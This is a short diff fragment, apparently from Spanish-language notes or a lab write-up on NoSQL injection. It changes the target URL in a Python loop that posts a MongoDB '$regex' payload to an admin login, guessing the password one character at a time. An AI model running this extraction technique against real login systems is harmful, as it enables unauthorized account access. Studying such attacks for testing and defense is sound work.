@@ -118,7 +118,7 @@ Podriamos aplicar Fuerza Bruta con las Regex para ir probando caracter por carac
 				post_data = '{"username":"admin","password":{"$regex":"^%s%s"}}' % (password, character)
 				p1.status(post_data)
 				headers = {'Content-Type': 'application/json'}
-				r = requests.post(login_url, headers=headers, data=post_data)
+				r = requests.post(main_url, headers=headers, data=post_data)
 				if "Logged in as user" in r.text:
 					password += character
 					p2.status(password)
